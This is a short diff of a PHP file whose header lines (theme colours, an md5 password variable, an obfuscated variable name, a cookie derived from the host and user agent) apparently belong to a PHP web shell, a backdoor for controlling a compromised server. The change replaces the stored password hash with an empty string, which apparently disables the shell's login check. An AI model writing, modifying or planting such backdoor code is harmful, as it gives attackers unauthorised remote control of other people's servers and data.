@@ -15,7 +15,7 @@ $color = "#fff";
 $Theme = '#008000';
 $TabsColor = '#008000';
 @session_start();
-$Pass = "1420a364a890d857c6e7c0f7559cd4fe";
+$Pass = "";
 $▙ = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
         prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
